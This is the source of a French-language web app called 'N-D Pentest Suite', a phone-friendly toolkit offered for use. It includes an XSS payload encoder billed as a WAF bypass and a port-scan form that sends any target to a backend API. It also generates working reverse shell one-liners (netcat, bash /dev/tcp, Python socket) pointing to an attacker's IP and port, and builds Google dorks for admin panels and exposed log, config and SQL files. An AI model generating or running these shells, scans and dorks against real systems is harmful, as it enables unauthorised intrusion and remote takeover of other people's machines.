<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>N-D Pentest Suite</title>
    <link rel="manifest" href="manifest.json">
    <style>
        body {
            background-color: #0d1117;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
            margin: 0;
        }
        h1 { color: #ff003c; text-align: center; font-size: 24px; }
        .card {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
        }
        input, select, button {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            background: #0d1117;
            border: 1px solid #00ff66;
            color: #00ff66;
            box-sizing: border-box;
            border-radius: 4px;
        }
        select {
            cursor: pointer;
        }
        button:active { background: #00ff66; color: #000; }
        #output { 
            background: #000; 
            padding: 10px; 
            border-radius: 5px; 
            min-height: 80px; 
            white-space: pre-wrap; 
            border: 1px solid #30363d;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <h1>👿 N-D PENTEST SUITE</h1>

    <div class="card">
        <h3>Encodage de Payload (Bypass WAF)</h3>
        <input type="text" id="payloadInput" value="<script>alert(1)</script>">
        <button onclick="encodePayload()">Encoder en Base64</button>
        <button onclick="encodeUrl()">Encoder en URL</button>
    </div>

    <div class="card">
        <h3>Scan de Port Distant (Vercel API)</h3>
        <input type="text" id="targetInput" placeholder="Ex: scanme.nmap.org ou IP">
        <button onclick="startScan()">Lancer le Scan</button>
    </div>

    <div class="card">
        <h3>Générateur de Reverse Shell</h3>
        <input type="text" id="attackerIp" placeholder="Ton IP d'écoute (Ex: 10.10.10.10)">
        <input type="number" id="attackerPort" placeholder="Ton Port (Ex: 4444)" value="4444">
        <select id="shellType">
            <option value="nc">Netcat traditional</option>
            <option value="bash">Bash -i</option>
            <option value="python">Python Short</option>
        </select>
        <button onclick="generateShell()">Générer le Shell</button>
    </div>

    <div class="card">
        <h3>Google Dorks Rapides</h3>
        <input type="text" id="dorkTarget" placeholder="Ex: cible.com">
        <button onclick="launchDork('admin')">Trouver panels Admin</button>
        <button onclick="launchDork('files')">Fichiers sensibles (Log, Conf)</button>
    </div>

    <div class="card">
        <h3>Console Output</h3>
        <div id="output">En attente d'action...</div>
    </div>

    <script>
        // Enregistrement du Service Worker pour le mode PWA
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js');
        }

        // --- Fonctions Outil 1 ---
        function encodePayload() {
            let input = document.getElementById('payloadInput').value;
            document.getElementById('output').innerText = btoa(input);
        }
        function encodeUrl() {
            let input = document.getElementById('payloadInput').value;
            document.getElementById('output').innerText = encodeURIComponent(input);
        }

        // --- Fonction Outil 2 (Connexion API Serverless Vercel) ---
        async function startScan() {
            let target = document.getElementById('targetInput').value.trim();
            if(!target) return alert("Met une cible bro !");
            
            document.getElementById('output').innerText = `Scan réseau en cours sur ${target} via l'API Vercel...\n(Ports testés: 22, 80, 443, 3306, 8080)`;
            
            try {
                // Utilisation du chemin relatif car l'API est sur le même projet Vercel
                const response = await fetch('/api/scan', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ target: target })
                });
                
                const data = await response.json();
                
                if (data.error) {
                    document.getElementById('output').innerText = `Erreur: ${data.error}`;
                } else {
                    document.getElementById('output').innerText = `[RÉSULTAT SCAN - ${data.target}]\n\n${data.result}`;
                }
            } catch (err) {
                document.getElementById('output').innerText = "Erreur fatale: Impossible de joindre la fonction API Vercel. Vérifie tes fichiers et le déploiement.";
            }
        }

        // --- Fonction Outil 3 (Reverse Shell) ---
        function generateShell() {
            let ip = document.getElementById('attackerIp').value.trim() || "10.10.10.10";
            let port = document.getElementById('attackerPort').value.trim() || "4444";
            let type = document.getElementById('shellType').value;
            let result = "";

            if (type === "nc") {
                result = `nc -e /bin/sh ${ip} ${port}`;
            } else if (type === "bash") {
                result = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
            } else if (type === "python") {
                result = `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`;
            }

            document.getElementById('output').innerText = result;
        }

        // --- Fonction Outil 4 (Google Dorks) ---
        function launchDork(type) {
            let target = document.getElementById('dorkTarget').value.trim();
            let query = "";

            if (type === 'admin') {
                query = target ? `site:${target} inurl:admin | inurl:login` : `inurl:admin | inurl:login`;
            } else if (type === 'files') {
                query = target ? `site:${target} ext:log | ext:cfg | ext:txt | ext:sql` : `ext:log | ext:cfg | ext:txt | ext:sql`;
            }

            let url = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
            // Ouvre la recherche Google dork dans un nouvel onglet de ton Safari iPhone
            window.open(url, '_blank');
            document.getElementById('output').innerText = `Dork lancé dans Safari :\n${query}`;
        }
    </script>
</body>
</html>
